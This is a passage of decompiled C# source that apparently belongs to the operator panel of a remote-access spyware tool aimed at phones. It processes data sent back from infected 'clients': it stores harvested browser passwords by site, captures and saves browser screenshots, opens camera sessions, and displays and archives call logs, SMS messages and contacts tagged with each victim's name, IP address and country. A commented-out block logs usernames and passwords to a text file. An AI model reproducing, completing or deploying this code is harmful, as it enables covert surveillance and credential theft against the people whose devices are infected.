												Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP\\Passwords");
											if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_Allmesages_0024245))
											{
												_0024VB_0024ResumableLocal_savename_0024250 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP\\Passwords\\" + Codes.ExtractDomain(_0024VB_0024ResumableLocal_sitename_0024243.Replace("\"", "")) + ".txt";
												if (!File.Exists(_0024VB_0024ResumableLocal_savename_0024250))
												{
													File.Create(_0024VB_0024ResumableLocal_savename_0024250).Dispose();
													File.AppendAllText(_0024VB_0024ResumableLocal_savename_0024250, "Client Name: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName + "\r\nClient IP: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP + "\r\nCountry: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + "\r\nDate :" + DateTime.Now.ToString() + "\r\n----------------------------------------\r\n");
												}
												File.WriteAllText(_0024VB_0024ResumableLocal_savename_0024250, _0024VB_0024ResumableLocal_Allmesages_0024245);
											}
										}
										else if (_0024VB_0024ResumableLocal_THEDATA_0024239.StartsWith("LF:"))
										{
											_0024VB_0024ResumableLocal_foundedsites_0024251 = _0024VB_0024ResumableLocal_THEDATA_0024239.Substring(3).Replace(".", "").Replace("\n", "")
												.Split('>');
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.linkspanel.Controls.Clear();
											}));
											_0024S252 = _0024VB_0024ResumableLocal_foundedsites_0024251;
											for (_0024S253 = 0; _0024S253 < _0024S252.Length; _0024S253++)
											{
												_0024VB_0024ResumableLocal_sit_0024254 = _0024S252[_0024S253];
												try
												{
													if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_sit_0024254))
													{
														_0024VB_0024ResumableLocal_cleanname_0024255 = Codes.BSDE(_0024VB_0024ResumableLocal_sit_0024254);
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.addlinks(_0024VB_0024ResumableLocal_cleanname_0024255);
													}
												}
												catch (Exception ex87)
												{
													ProjectData.SetProjectError(ex87);
													Exception ex88 = ex87;
													_0024VB_0024ResumableLocal_ex_0024256 = ex88;
													ProjectData.ClearProjectError();
												}
											}
										}
										else if (_0024VB_0024ResumableLocal_THEDATA_0024239.StartsWith("L:"))
										{
											_0024VB_0024ResumableLocal_userdata_0024257 = _0024VB_0024ResumableLocal_THEDATA_0024239.Substring(2);
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.MapData.Clear();
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.namescombo.Items.Clear();
											}));
											if (_0024VB_0024ResumableLocal_userdata_0024257.Contains("!"))
											{
												_0024VB_0024ResumableLocal_alldata_0024258 = _0024VB_0024ResumableLocal_userdata_0024257.Split('!');
												_0024S259 = _0024VB_0024ResumableLocal_alldata_0024258;
												for (_0024S260 = 0; _0024S260 < _0024S259.Length; _0024S260++)
												{
													_0024VB_0024ResumableLocal_sdata_0024261 = _0024S259[_0024S260];
													if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_sdata_0024261))
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262 = new _Closure_0024__39_002D16(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262);
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024NonLocal__0024VB_0024Closure_12 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024237;
														_0024VB_0024ResumableLocal_singler_0024263 = _0024VB_0024ResumableLocal_sdata_0024261.Split('>');
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_name = _0024VB_0024ResumableLocal_singler_0024263[0];
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_lnk = _0024VB_0024ResumableLocal_singler_0024263[1];
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_id = _0024VB_0024ResumableLocal_singler_0024263[2];
														MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
														{
															_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_name);
															if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_name))
																_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.Add(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_name, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_lnk + ":" + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024262._0024VB_0024Local_id);
														}));
													}
												}
											}
											else if (_0024VB_0024ResumableLocal_userdata_0024257.Contains(">"))
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264 = new _Closure_0024__39_002D17(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264);
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024NonLocal__0024VB_0024Closure_13 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024237;
												_0024VB_0024ResumableLocal_singler_0024265 = _0024VB_0024ResumableLocal_userdata_0024257.Split('>');
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_name = _0024VB_0024ResumableLocal_singler_0024265[0];
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_lnk = _0024VB_0024ResumableLocal_singler_0024265[1];
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_id = _0024VB_0024ResumableLocal_singler_0024265[2];
												MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_name);
													if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_name))
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.Add(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_name, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_lnk + ":" + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024264._0024VB_0024Local_id);
												}));
											}
										}
										else if (_0024VB_0024ResumableLocal_THEDATA_0024239.StartsWith("MSG:"))
										{
											_0024VB_0024ResumableLocal_newmsg_0024266 = _0024VB_0024ResumableLocal_THEDATA_0024239.Substring(4);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.statustext.Text = _0024VB_0024ResumableLocal_newmsg_0024266;
										}
										else if (Operators.CompareString(_0024VB_0024ResumableLocal_THEDATA_0024239, "user-out", TextCompare: false) == 0)
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.statustext.Text = "Client Closed Browser";
										}
										else
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.statustext.Text = "Connected...";
											_0024VB_0024ResumableLocal_webimage_0024267 = new Bitmap(Codes.Base64ToImage(_0024VB_0024ResumableLocal_THEDATA_0024239));
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.vsbar.Height = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.vewimage.Height;
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.vsbar.Maximum = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.vewimage.Height;
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.vewimage.Image = _0024VB_0024ResumableLocal_webimage_0024267;
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.SaveCheck.Checked)
											{
												if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP"))
													Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP");
												_0024VB_0024ResumableLocal_tosave_0024268 = new Bitmap(Codes.Base64ToImage(_0024VB_0024ResumableLocal_THEDATA_0024239));
												_0024VB_0024ResumableLocal_tosave_0024268.Save(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP\\" + DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".jpg");
											}
										}
									}
									catch (Exception ex89)
									{
										ProjectData.SetProjectError(ex89);
										Exception ex90 = ex89;
										_0024VB_0024ResumableLocal_ex_0024269 = ex90;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "-44", TextCompare: false) == 0)
								{
									
										_0024VB_0024ResumableLocal_handle_0024270 = "SM_Hunter_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
									///	_0024VB_0024ResumableLocal_Faker_0024271 = (Faker)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024270];
								///if/// (_0024VB_0024ResumableLocal_Faker_0024271 != null)
										  ///{
										  ///_0024VB_0024ResumableLocal_THEDATA_0024272 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										  ///_0024VB_0024ResumableLocal_objects_0024273 = (object[])reso.formatPasses(_0024VB_0024ResumableLocal_THEDATA_0024272);
										  ///_0024VB_0024ResumableLocal_Faker_0024271.DataGridView1.Rows.Add(_0024VB_0024ResumableLocal_objects_0024273[0], _0024VB_0024ResumableLocal_objects_0024273[1], _0024VB_0024ResumableLocal_objects_0024273[2]);
										  ///	File.AppendAllText(_0024VB_0024ResumableLocal_Faker_0024271.DownloadsFolder + "\\Passwords.txt", Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("\r\n->", _0024VB_0024ResumableLocal_objects_0024273[0]), " UserName:"), _0024VB_0024ResumableLocal_objects_0024273[1]), " Password:"), _0024VB_0024ResumableLocal_objects_0024273[2]))));
										  ///	}
										  ///}
										  ///catch (Exception ex91)
										  ///	{
										  ///	ProjectData.SetProjectError(ex91);
											//	///Exception ex92 = ex91;
											///	_0024VB_0024ResumableLocal_ex_0024274 = ex92;
											///ProjectData.ClearProjectError();
												}
						
							
								else if (Operators.CompareString(_0024S186, "-88", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_handle_0024275 = "Web_Browser_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
										_0024VB_0024ResumableLocal_Faker_0024276 = (WebViewMonitor)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024275];
										if (_0024VB_0024ResumableLocal_Faker_0024276 != null)
										{
											_0024VB_0024ResumableLocal_THEDATA_0024277 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
											(_0024S278 = _0024VB_0024ResumableLocal_Faker_0024276.resulttext).Text = _0024S278.Text + _0024VB_0024ResumableLocal_THEDATA_0024277 + "\r\n- - - - - - - - - - - -\r\n";
										}
									}
									catch (Exception ex93)
									{
										ProjectData.SetProjectError(ex93);
										Exception ex94 = ex93;
										_0024VB_0024ResumableLocal_ex_0024279 = ex94;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "-699", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_THEDATA_0024280 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										_0024VB_0024ResumableLocal_response_0024281 = _0024VB_0024ResumableLocal_THEDATA_0024280.Split('#');
										_0024VB_0024ResumableLocal_TargetClientaddress_0024282 = _0024VB_0024ResumableLocal_response_0024281[0];
										_0024VB_0024ResumableLocal_sizes_0024283 = _0024VB_0024ResumableLocal_response_0024281[1].Split(',');
										_0024VB_0024ResumableLocal_targetclient_0024284 = (Client)GetCollection(_0024VB_0024ResumableLocal_TargetClientaddress_0024282)[0];
										_0024VB_0024ResumableLocal_address_0024285 = _0024VB_0024ResumableLocal_response_0024281[0];
										if (_0024VB_0024ResumableLocal_targetclient_0024284 != null)
											_0024VB_0024ResumableLocal_address_0024285 = _0024VB_0024ResumableLocal_targetclient_0024284.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_handle_0024286 = "Camera_Manager_" + _0024VB_0024ResumableLocal_address_0024285;
										_0024VB_0024ResumableLocal_CameraManager_0024287 = (CameraManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024286];
										if (_0024VB_0024ResumableLocal_CameraManager_0024287 == null)
										{
											_0024VB_0024ResumableLocal_CameraManager_0024287 = new CameraManager();
											_0024VB_0024ResumableLocal_CameraManager_0024287.Name = _0024VB_0024ResumableLocal_handle_0024286;
											_0024VB_0024ResumableLocal_CameraManager_0024287.Title = string.Format("{0} - IP:{1}", "Camera Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
											_0024VB_0024ResumableLocal_CameraManager_0024287.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
											if (_0024VB_0024ResumableLocal_CameraManager_0024287.classClient != null)
											{
												reso.Directory_Exist(_0024VB_0024ResumableLocal_CameraManager_0024287.classClient);
												_0024VB_0024ResumableLocal_CameraManager_0024287.tmpFolderUSER = _0024VB_0024ResumableLocal_CameraManager_0024287.classClient.FolderUSER;
											}
											_0024VB_0024ResumableLocal_cClients_0024288 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient;
											_0024VB_0024ResumableLocal_CameraManager_0024287.Client = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient;
											_0024VB_0024ResumableLocal_CameraManager_0024287.classCamera = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
											_0024VB_0024ResumableLocal_CameraManager_0024287.TempImage = new PictureBox();
											_0024VB_0024ResumableLocal_CameraManager_0024287.Show();
											_0024VB_0024ResumableLocal_CameraManager_0024287.addsizes(new object[1] { _0024VB_0024ResumableLocal_sizes_0024283 });
										}
									}
									catch (Exception ex95)
									{
										ProjectData.SetProjectError(ex95);
										Exception ex96 = ex95;
										_0024VB_0024ResumableLocal_ex_0024289 = ex96;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, SecurityKey.getCalls, TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_SPL_0024290 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
										_0024VB_0024ResumableLocal_SPL_lines_0024291 = _0024VB_0024ResumableLocal_SPL_0024290[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
										_0024VB_0024ResumableLocal_handle_0024292 = "Calls_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_CallsManager_0024293 = (CallsManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024292];
										if (_0024VB_0024ResumableLocal_CallsManager_0024293 == null)
										{
											_0024VB_0024ResumableLocal_CallsManager_0024293 = new CallsManager();
											_0024VB_0024ResumableLocal_CallsManager_0024293.Name = _0024VB_0024ResumableLocal_handle_0024292;
											_0024VB_0024ResumableLocal_CallsManager_0024293.Title = string.Format("{0} - IP:{1}", "Calls Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
											_0024VB_0024ResumableLocal_CallsManager_0024293.Client = _0024VB_0024ResumableLocal_Client_00243;
											_0024VB_0024ResumableLocal_CallsManager_0024293.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
											_0024VB_0024ResumableLocal_CallsManager_0024293.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
											_0024VB_0024ResumableLocal_CallsManager_0024293.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
											_0024VB_0024ResumableLocal_CallsManager_0024293.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
											_0024VB_0024ResumableLocal_CallsManager_0024293.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
											_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Columns[5].Width = 48;
											_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Columns[5].DisplayIndex = 0;
											_0024VB_0024ResumableLocal_CallsManager_0024293.Show();
										}
										_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Enabled = false;
										_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Rows.Clear();
										_0024VB_0024ResumableLocal_Counter_0024294 = 0;
										_0024S295 = _0024VB_0024ResumableLocal_SPL_lines_0024291;
										for (_0024S296 = 0; _0024S296 < _0024S295.Length; _0024S296++)
										{
											_0024VB_0024ResumableLocal_ea_0024297 = _0024S295[_0024S296];
											_0024VB_0024ResumableLocal_ay_0024298 = _0024VB_0024ResumableLocal_ea_0024297.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_getPath_0024299 = null;
											_0024S300 = _0024VB_0024ResumableLocal_ay_0024298[2];
											switch (_0024S300)
											{
												default:
													_0024VB_0024ResumableLocal_getPath_0024299 = reso.res_Path + "\\Icons\\FillEllipse\\null.png";
													break;
												case "Missed":
													_0024VB_0024ResumableLocal_getPath_0024299 = reso.res_Path + "\\Icons\\FillEllipse\\Missed.png";
													break;
												case "Outgoing":
													_0024VB_0024ResumableLocal_getPath_0024299 = reso.res_Path + "\\Icons\\FillEllipse\\Outgoing.png";
													break;
												case "Incoming":
													_0024VB_0024ResumableLocal_getPath_0024299 = reso.res_Path + "\\Icons\\FillEllipse\\Incoming.png";
													break;
											}
											_0024VB_0024ResumableLocal_id_0024301 = _0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024298[0], _0024VB_0024ResumableLocal_ay_0024298[1], _0024VB_0024ResumableLocal_ay_0024298[2], _0024VB_0024ResumableLocal_ay_0024298[3], Codes.Duration(Conversions.ToInteger(_0024VB_0024ResumableLocal_ay_0024298[4])), reso.GetEllImage(0, new object[5] { _0024VB_0024ResumableLocal_getPath_0024299, 15, 15, 17, 17 }));
											_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024301].Tag = _0024VB_0024ResumableLocal_ay_0024298[5];
											_0024VB_0024ResumableLocal_CallsManager_0024293.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024294, _0024VB_0024ResumableLocal_SPL_lines_0024291.Length - 1);
											_0024VB_0024ResumableLocal_Counter_0024294++;
											Application.DoEvents();
										}
										_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0.Enabled = true;
										_0024VB_0024ResumableLocal_CallsManager_0024293.PB.Value = 0;
										if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0)
										{
											reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
											ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
											{
												reso.SAVEit((Array)a0);
											}, new object[8]
											{
												_0024VB_0024ResumableLocal_CallsManager_0024293.DGV0,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
												"Calls Manager",
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
												"Call Log",
												"log",
												DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
											});
										}
									}
									catch (Exception ex97)
									{
										ProjectData.SetProjectError(ex97);
										Exception ex98 = ex97;
										_0024VB_0024ResumableLocal_ex_0024302 = ex98;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, SecurityKey.getSMS, TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_SPL_0024303 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
										_0024VB_0024ResumableLocal_SPL_lines_0024304 = _0024VB_0024ResumableLocal_SPL_0024303[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
										_0024VB_0024ResumableLocal_handle_0024305 = "SMS_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_SMSManager_0024306 = (SMSManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024305];
										if (_0024VB_0024ResumableLocal_SMSManager_0024306 == null)
										{
											_0024VB_0024ResumableLocal_SMSManager_0024306 = new SMSManager();
											_0024VB_0024ResumableLocal_SMSManager_0024306.Name = _0024VB_0024ResumableLocal_handle_0024305;
											_0024VB_0024ResumableLocal_SMSManager_0024306.Title = string.Format("{0} - IP:{1}", "SMS Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
											_0024VB_0024ResumableLocal_SMSManager_0024306.Client = _0024VB_0024ResumableLocal_Client_00243;
											_0024VB_0024ResumableLocal_SMSManager_0024306.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
											_0024VB_0024ResumableLocal_SMSManager_0024306.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
											_0024VB_0024ResumableLocal_SMSManager_0024306.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
											_0024VB_0024ResumableLocal_SMSManager_0024306.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
											_0024VB_0024ResumableLocal_SMSManager_0024306.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
											_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Columns[5].Width = 48;
											_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Columns[5].DisplayIndex = 0;
											_0024VB_0024ResumableLocal_SMSManager_0024306.Show();
										}
										_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Enabled = false;
										_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Rows.Clear();
										_0024VB_0024ResumableLocal_path_0024307 = null;
										_0024VB_0024ResumableLocal_Counter_0024308 = 0;
										_0024S309 = _0024VB_0024ResumableLocal_SPL_lines_0024304;
										for (_0024S310 = 0; _0024S310 < _0024S309.Length; _0024S310++)
										{
											_0024VB_0024ResumableLocal_ea_0024311 = _0024S309[_0024S310];
											_0024VB_0024ResumableLocal_ay_0024312 = _0024VB_0024ResumableLocal_ea_0024311.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_idRow_0024313 = _0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024312[0], _0024VB_0024ResumableLocal_ay_0024312[1], _0024VB_0024ResumableLocal_ay_0024312[2], _0024VB_0024ResumableLocal_ay_0024312[3], _0024VB_0024ResumableLocal_ay_0024312[5], reso.GetEllImage(1, new object[5]
											{
												_0024VB_0024ResumableLocal_ay_0024312[1],
												_0024VB_0024ResumableLocal_ay_0024312[0],
												"<->",
												null,
												null
											}));
											_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Rows[_0024VB_0024ResumableLocal_idRow_0024313].Tag = _0024VB_0024ResumableLocal_ay_0024312[4];
											_0024VB_0024ResumableLocal_path_0024307 = _0024VB_0024ResumableLocal_ay_0024312[5];
											_0024VB_0024ResumableLocal_SMSManager_0024306.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024308, _0024VB_0024ResumableLocal_SPL_lines_0024304.Length - 1);
											_0024VB_0024ResumableLocal_Counter_0024308++;
											Application.DoEvents();
										}
										_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0.Enabled = true;
										_0024VB_0024ResumableLocal_SMSManager_0024306.PB.Value = 0;
										if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0)
										{
											reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
											ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
											{
												reso.SAVEit((Array)a0);
											}, new object[8]
											{
												_0024VB_0024ResumableLocal_SMSManager_0024306.DGV0,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
												"SMS Manager",
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
												"SMS",
												"sms",
												DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
											});
										}
									}
									catch (Exception ex99)
									{
										ProjectData.SetProjectError(ex99);
										Exception ex100 = ex99;
										_0024VB_0024ResumableLocal_ex_0024314 = ex100;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, SecurityKey.getContacts, TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_SPL_0024315 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
										_0024VB_0024ResumableLocal_SPL_lines_0024316 = _0024VB_0024ResumableLocal_SPL_0024315[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
										_0024VB_0024ResumableLocal_handle_0024317 = "Contacts_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_ContactsManager_0024318 = (ContactsManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024317];
										if (_0024VB_0024ResumableLocal_ContactsManager_0024318 == null)
										{
											_0024VB_0024ResumableLocal_ContactsManager_0024318 = new ContactsManager();
											_0024VB_0024ResumableLocal_ContactsManager_0024318.Name = _0024VB_0024ResumableLocal_handle_0024317;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.Title = string.Format("{0} - IP:{1}", "Contacts Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
											_0024VB_0024ResumableLocal_ContactsManager_0024318.Client = _0024VB_0024ResumableLocal_Client_00243;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
